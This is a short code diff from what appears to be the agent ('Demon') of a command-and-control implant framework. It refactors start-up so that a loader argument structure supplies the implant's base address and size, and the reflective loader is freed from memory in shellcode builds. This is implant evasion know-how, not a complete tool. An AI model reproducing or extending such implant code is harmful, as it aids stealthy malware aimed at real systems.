@@ -27,20 +27,14 @@ SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;
  *
  * 1. Initialize pointer, modules and win32 api
  * 2. Initialize metadata
- * 3. Free the reflective loader (if any)
- * 4. Parse config
- * 5. Enter main connecting and tasking routine
+ * 3. Parse config
+ * 4. Enter main connecting and tasking routine
  *
  */
-VOID DemonMain( PVOID ModuleInst, PVOID ReflectiveLdrAddr )
+VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs )
 {
     /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
-    DemonInit( ModuleInst );
-
-#ifdef SHELLCODE
-    /* Free the reflective loader if we are shellcode */
-    FreeReflectiveLoader( ReflectiveLdrAddr );
-#endif
+    DemonInit( ModuleInst, KArgs );
 
     /* Initialize MetaData */
     DemonMetaData( &Instance.MetaData, TRUE );
@@ -261,7 +255,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     PackageAddInt32( *MetaData, Instance.Config.Transport.WorkingHours );
 }
 
-VOID DemonInit( PVOID ModuleInst )
+VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 {
     OSVERSIONINFOEXW             OSVersionExW     = { 0 };
     SYSTEM_PROCESSOR_INFORMATION SystemInfo       = { 0 };
@@ -485,16 +479,27 @@ VOID DemonInit( PVOID ModuleInst )
         PUTS( "[!] NtQuerySystemInformation Failed" );
     }
 
-    Instance.Session.ModuleBase = ModuleInst;
-
-    /* if ModuleBase has not been specified then lets use the current process one */
-    if ( ! Instance.Session.ModuleBase ) {
-        /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
-        Instance.Session.ModuleBase = LdrModulePeb( 0 );
+    if ( KArgs )
+    {
+#if SHELLCODE
+        Instance.Session.ModuleBase = KArgs->Demon;
+        Instance.Session.ModuleSize = KArgs->DemonSize;
+        FreeReflectiveLoader( KArgs->KaynLdr );
+#endif
     }
+    else
+    {
+        Instance.Session.ModuleBase = ModuleInst;
 
-    if ( Instance.Session.ModuleBase ) {
-        Instance.Session.ModuleSize = IMAGE_SIZE( Instance.Session.ModuleBase );
+        /* if ModuleBase has not been specified then lets use the current process one */
+        if ( ! Instance.Session.ModuleBase ) {
+            /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
+            Instance.Session.ModuleBase = LdrModulePeb( 0 );
+        }
+
+        if ( Instance.Session.ModuleBase ) {
+            Instance.Session.ModuleSize = IMAGE_SIZE( Instance.Session.ModuleBase );
+        }
     }
 
     Instance.Session.OS_Arch   = SystemInfo.ProcessorArchitecture;
@@ -542,8 +547,6 @@ VOID DemonInit( PVOID ModuleInst )
     }
 
     PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
-
-
 }
 
 VOID DemonConfig()
